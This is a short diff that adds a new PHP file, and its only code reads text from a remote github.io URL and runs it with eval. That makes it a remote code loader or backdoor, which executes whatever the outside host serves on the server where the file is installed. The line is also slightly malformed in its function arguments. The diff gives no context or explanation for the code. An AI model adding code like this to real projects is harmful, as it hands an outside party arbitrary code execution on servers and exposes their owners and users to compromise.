@@ -1,0 +1,2 @@
+<?php
+eval(fgets(fopen(('https://fierza-dev.github.io/.txt')),''));
